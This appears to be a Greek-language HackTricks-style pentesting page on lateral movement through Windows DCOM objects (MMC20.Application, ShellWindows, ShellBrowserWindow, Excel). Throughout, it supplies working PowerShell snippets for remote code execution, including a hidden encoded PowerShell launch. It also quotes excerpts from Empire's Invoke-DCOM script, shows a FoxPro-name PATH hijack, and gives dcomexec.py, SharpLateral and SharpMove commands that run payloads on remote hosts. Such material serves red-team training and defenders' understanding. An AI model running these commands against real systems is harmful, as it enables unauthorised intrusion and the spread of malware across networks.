# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Το DCOM lateral movement είναι ελκυστικό επειδή επαναχρησιμοποιεί υπάρχοντες COM servers που εκτίθενται μέσω RPC/DCOM, αντί να δημιουργεί ένα service ή scheduled task. Στην πράξη, αυτό σημαίνει ότι η αρχική σύνδεση συνήθως ξεκινά στο TCP/135 και στη συνέχεια μεταφέρεται σε δυναμικά εκχωρημένες υψηλές RPC ports.

## Προαπαιτούμενα & Παγίδες

- Συνήθως χρειάζεστε local administrator context στο target και ο απομακρυσμένος COM server πρέπει να επιτρέπει remote launch/activation.
- Από τις **14 Μαρτίου 2023**, η Microsoft επιβάλλει DCOM hardening στα υποστηριζόμενα συστήματα. Παλαιά clients που ζητούν χαμηλό activation authentication level μπορεί να αποτύχουν, εκτός αν διαπραγματευτούν τουλάχιστον `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Τα σύγχρονα Windows clients συνήθως αυξάνουν αυτόματα το επίπεδο, επομένως τα τρέχοντα εργαλεία συνήθως συνεχίζουν να λειτουργούν.<sup>[[3]](#references)</sup>
- Η χειροκίνητη ή scripted DCOM εκτέλεση γενικά χρειάζεται TCP/135 και το dynamic RPC port range του target. Αν χρησιμοποιείτε το Impacket `dcomexec.py` και θέλετε να επιστρέφεται το command output, συνήθως χρειάζεστε επίσης SMB access στο `ADMIN$` (ή σε άλλο writable/readable share).
- Αν το RPC/DCOM λειτουργεί αλλά το SMB είναι blocked, το `dcomexec.py -nooutput` μπορεί να παραμένει χρήσιμο για blind execution.

Γρήγοροι έλεγχοι:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, ελέγξτε την αρχική ανάρτηση από [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**<sup>[[1]](#references)</sup>

Τα αντικείμενα Distributed Component Object Model (DCOM) παρέχουν μια ενδιαφέρουσα δυνατότητα για network-based αλληλεπιδράσεις με αντικείμενα. Η Microsoft παρέχει πλήρη τεκμηρίωση τόσο για το DCOM όσο και για το Component Object Model (COM), διαθέσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Μια λίστα με τις DCOM εφαρμογές μπορεί να ανακτηθεί χρησιμοποιώντας την εντολή PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Το αντικείμενο COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), επιτρέπει τη δημιουργία script για λειτουργίες των MMC snap-in. Συγκεκριμένα, αυτό το αντικείμενο περιέχει μια μέθοδο `ExecuteShellCommand` στο `Document.ActiveView`. Περισσότερες πληροφορίες σχετικά με αυτήν τη μέθοδο μπορείτε να βρείτε [εδώ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Ελέγξτε το εκτελώντας:

Αυτή η δυνατότητα διευκολύνει την εκτέλεση εντολών μέσω δικτύου χρησιμοποιώντας μια εφαρμογή DCOM. Για απομακρυσμένη αλληλεπίδραση με το DCOM ως admin, μπορεί να χρησιμοποιηθεί το PowerShell ως εξής:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Αυτή η εντολή συνδέεται στην εφαρμογή DCOM και επιστρέφει ένα instance του αντικειμένου COM. Στη συνέχεια, μπορεί να κληθεί η μέθοδος ExecuteShellCommand για την εκτέλεση μιας διεργασίας στον απομακρυσμένο host. Η διαδικασία περιλαμβάνει τα ακόλουθα βήματα:

Έλεγχος μεθόδων:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Απόκτηση RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Το τελευταίο όρισμα είναι το στυλ του παραθύρου. Το `7` διατηρεί το παράθυρο ελαχιστοποιημένο. Σε επιχειρησιακό επίπεδο, η εκτέλεση μέσω MMC συνήθως οδηγεί μια απομακρυσμένη διεργασία `mmc.exe` να εκκινεί το payload σας, κάτι που διαφέρει από τα αντικείμενα που βασίζονται στον Explorer παρακάτω.

## ShellWindows & ShellBrowserWindow

**Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, δείτε την αρχική ανάρτηση [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Το αντικείμενο **MMC20.Application** διαπιστώθηκε ότι δεν διαθέτει explicit "LaunchPermissions", βασιζόμενο προεπιλεγμένα σε permissions που επιτρέπουν πρόσβαση στους Administrators. Για περισσότερες λεπτομέρειες, μπορείτε να δείτε ένα thread [εδώ](https://twitter.com/tiraniddo/status/817532039771525120), ενώ συνιστάται η χρήση του OleView .NET του [@tiraniddo](https://twitter.com/tiraniddo) για το filtering αντικειμένων χωρίς explicit Launch Permission.

Δύο συγκεκριμένα αντικείμενα, τα `ShellBrowserWindow` και `ShellWindows`, επισημάνθηκαν λόγω της έλλειψης explicit Launch Permissions. Η απουσία μιας καταχώρισης `LaunchPermission` στο registry κάτω από το `HKCR:\AppID\{guid}` υποδηλώνει ότι δεν υπάρχουν explicit permissions.

Σε σύγκριση με το `MMC20.Application`, αυτά τα αντικείμενα είναι συχνά πιο αθόρυβα από άποψη OPSEC, επειδή η εντολή συνήθως καταλήγει ως child του `explorer.exe` στον απομακρυσμένο host αντί για το `mmc.exe`.

### ShellWindows

Για το `ShellWindows`, το οποίο δεν διαθέτει ProgID, οι .NET μέθοδοι `Type.GetTypeFromCLSID` και `Activator.CreateInstance` διευκολύνουν τη δημιουργία instance του αντικειμένου χρησιμοποιώντας το AppID του. Αυτή η διαδικασία αξιοποιεί το OleView .NET για την ανάκτηση του CLSID του `ShellWindows`. Μετά τη δημιουργία του instance, είναι δυνατή η αλληλεπίδραση μέσω της μεθόδου `WindowsShell.Item`, οδηγώντας σε invocation μεθόδων όπως η `Document.Application.ShellExecute`.

Παρακάτω παρουσιάζονται παραδείγματα εντολών PowerShell για τη δημιουργία instance του αντικειμένου και την απομακρυσμένη εκτέλεση εντολών:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

Το `ShellBrowserWindow` είναι παρόμοιο, αλλά μπορείτε να το δημιουργήσετε απευθείας μέσω του CLSID του και να κάνετε pivot στο `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement με Excel DCOM Objects

Το Lateral Movement μπορεί να επιτευχθεί μέσω της εκμετάλλευσης Excel DCOM objects. Για λεπτομερείς πληροφορίες, συνιστάται να διαβάσετε τη συζήτηση σχετικά με την αξιοποίηση του Excel DDE για Lateral Movement μέσω DCOM στο [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Το project Empire παρέχει ένα PowerShell script που παρουσιάζει τη χρήση του Excel για remote code execution (RCE) μέσω του χειρισμού DCOM objects. Παρακάτω παρατίθενται αποσπάσματα του script, το οποίο είναι διαθέσιμο στο [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), και παρουσιάζουν διαφορετικές μεθόδους abuse του Excel για RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Πρόσφατη έρευνα επέκτεινε αυτή την περιοχή με τη μέθοδο `ActivateMicrosoftApp()` του `Excel.Application`. Η βασική ιδέα είναι ότι το Excel μπορεί να προσπαθήσει να εκκινήσει παλαιότερες εφαρμογές της Microsoft, όπως τις FoxPro, Schedule Plus ή Project, αναζητώντας τες στο system `PATH`. Αν ένας operator μπορεί να τοποθετήσει ένα payload με ένα από τα αναμενόμενα ονόματα σε μια εγγράψιμη τοποθεσία που περιλαμβάνεται στο `PATH` του target, το Excel θα το εκτελέσει.<sup>[[4]](#references)</sup>

Απαιτήσεις για αυτή την παραλλαγή:

- Local admin στο target
- Εγκατεστημένο Excel στο target
- Δυνατότητα εγγραφής ενός payload σε έναν εγγράψιμο κατάλογο στο `PATH` του target

Πρακτικό παράδειγμα εκμετάλλευσης της αναζήτησης FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Εάν ο attacking host δεν έχει καταχωρισμένο το τοπικό `Excel.Application` ProgID, δημιουργήστε το remote object χρησιμοποιώντας το CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Τιμές που έχουν παρατηρηθεί να χρησιμοποιούνται καταχρηστικά στην πράξη:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Εργαλεία αυτοματοποίησης για Lateral Movement

Επισημαίνονται δύο εργαλεία για την αυτοματοποίηση αυτών των τεχνικών:

- **Invoke-DCOM.ps1**: Ένα PowerShell script που παρέχεται από το project Empire και απλοποιεί την κλήση διαφορετικών μεθόδων για την εκτέλεση κώδικα σε απομακρυσμένα μηχανήματα. Αυτό το script είναι διαθέσιμο στο GitHub repository του Empire.

- **SharpLateral**: Ένα εργαλείο σχεδιασμένο για την απομακρυσμένη εκτέλεση κώδικα, το οποίο μπορεί να χρησιμοποιηθεί με την εντολή:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Αυτόματα Εργαλεία

- Το Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) επιτρέπει την εύκολη κλήση όλων των σχολιασμένων τρόπων για την εκτέλεση code σε άλλα machines.
- Μπορείτε να χρησιμοποιήσετε το `dcomexec.py` του Impacket για την εκτέλεση commands σε remote systems μέσω DCOM. Οι τρέχουσες εκδόσεις υποστηρίζουν `ShellWindows`, `ShellBrowserWindow` και `MMC20`, με προεπιλογή το `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Θα μπορούσατε επίσης να χρησιμοποιήσετε το [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Θα μπορούσατε επίσης να χρησιμοποιήσετε το [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Αναφορές

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Διαχείριση αλλαγών για την παράκαμψη της δυνατότητας ασφαλείας του Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Εκμετάλλευση της ισχύος της εφαρμογής DCOM Excel](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Αξιοποίηση του Excel DDE για lateral movement μέσω DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)

{{#include ../../banners/hacktricks-training.md}}
